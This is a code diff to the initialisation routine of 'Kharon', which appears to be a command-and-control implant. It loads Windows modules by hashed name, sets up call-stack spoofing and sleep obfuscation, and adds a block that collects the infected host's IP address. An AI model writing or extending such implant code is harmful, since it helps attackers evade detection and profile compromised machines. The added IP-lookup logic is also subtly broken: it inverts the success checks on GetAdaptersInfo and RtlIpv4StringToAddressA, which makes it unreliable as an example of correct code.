@@ -197,6 +197,7 @@ auto DECLFN Kharon::Init(
     this->Cryptbase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "cryptbase.dll" ) );
     this->Ws2_32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
     this->Msvcrt.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "msvcrt.dll" ) );
+    this->Iphlpapi.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "iphlpapi.dll" ) );
 
     /* ========= [ calculate stack for spoof ] ========= */
     this->Spf->Setup.First.Size  = this->Spf->StackSizeWrapper( this->Spf->Setup.First.Ptr );
@@ -211,6 +212,7 @@ auto DECLFN Kharon::Init(
     if ( ! this->Cryptbase.Handle ) this->Cryptbase.Handle = this->Lib->Load( "cryptbase.dll" );
     if ( ! this->Ws2_32.Handle    ) this->Ws2_32.Handle    = this->Lib->Load( "ws2_32.dll"    );
     if ( ! this->Msvcrt.Handle    ) this->Msvcrt.Handle    = this->Lib->Load( "msvcrt.dll"    );
+    if ( ! this->Iphlpapi.Handle  ) this->Iphlpapi.Handle  = this->Lib->Load( "iphlpapi.dll"  );
 
     RSL_IMP( Mscoree   );
     RSL_IMP( Advapi32  );
@@ -221,6 +223,7 @@ auto DECLFN Kharon::Init(
     RSL_IMP( Cryptbase );
     RSL_IMP( Ws2_32    );
     RSL_IMP( Msvcrt    );
+    RSL_IMP( Iphlpapi  );
 
     this->Ntdll.khRtlFillMemory = ( decltype( this->Ntdll.khRtlFillMemory ) )LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str<CHAR>( "RtlFillMemory" ) );
     this->Krnl32.InitializeProcThreadAttributeList = ( decltype( this->Krnl32.InitializeProcThreadAttributeList ) )this->Krnl32.GetProcAddress( (HMODULE)this->Krnl32.Handle, "InitializeProcThreadAttributeList" );
@@ -238,6 +241,7 @@ auto DECLFN Kharon::Init(
     KhDbgz( "Library cryptbase.dll Loaded at %p and Functions Resolveds", this->Cryptbase.Handle );
     KhDbgz( "Library ws2_32.dll    Loaded at %p and Functions Resolveds", this->Ws2_32.Handle    );
     KhDbgz( "Library msvcrt.dll    Loaded at %p and Functions Resolveds", this->Msvcrt.Handle    );
+    KhDbgz( "Library iphlpapi.dll  Loaded at %p and Functions Resolveds", this->Iphlpapi.Handle  );
 
     /* ========= [ cfg exceptions to sleep obf ] ========= */
     if ( this->Machine.CfgEnabled = this->Usf->CfgCheck() ) {
@@ -308,7 +312,7 @@ auto DECLFN Kharon::Init(
 
     this->Ntdll.NtQueryInformationProcess( 
         NtCurrentProcess(), ProcessBasicInformation, 
-        &PsBasicInfoEx, sizeof( PsBasicInfoEx ), NULL 
+        &PsBasicInfoEx, sizeof( PsBasicInfoEx ), nullptr 
     );
 
     this->Krnl32.GlobalMemoryStatusEx( &MemInfoEx );
@@ -372,6 +376,34 @@ auto DECLFN Kharon::Init(
     if ( ! Success ) {
         this->Machine.NetBios = (PCHAR)this->Hp->Alloc( TmpVal );
         this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, A_PTR( this->Machine.NetBios ), &TmpVal );
+    }
+
+    IN_ADDR          IpObject   = { 0 };
+    ULONG            AdapterLen = 0;
+    PVOID            Terminator = nullptr;
+    IP_ADAPTER_INFO* Adapter    = { nullptr };
+
+    KhDbgz("adp: %p", this->Iphlpapi.GetAdaptersInfo);
+
+    this->Iphlpapi.GetAdaptersInfo( nullptr, &AdapterLen );
+    Adapter = (IP_ADAPTER_INFO*)this->Hp->Alloc( AdapterLen );
+    if ( Adapter ) {
+        IP_ADAPTER_INFO* CurrentAdapter = Adapter;
+
+        while ( Adapter ) {
+            if ( this->Iphlpapi.GetAdaptersInfo( CurrentAdapter, &AdapterLen ) ) {
+                if ( this->Ntdll.RtlIpv4StringToAddressA( CurrentAdapter->IpAddressList.IpAddress.String, FALSE, (PCHAR*)&Terminator, &IpObject ) ) {
+                    this->Machine.IpAddress = IpObject.S_un.S_addr;
+                    break;
+                }
+
+                CurrentAdapter = CurrentAdapter->Next;
+            }
+
+            break;
+        }
+
+        this->Hp->Free( Adapter );
     }
 
     TmpVal = MAX_PATH;
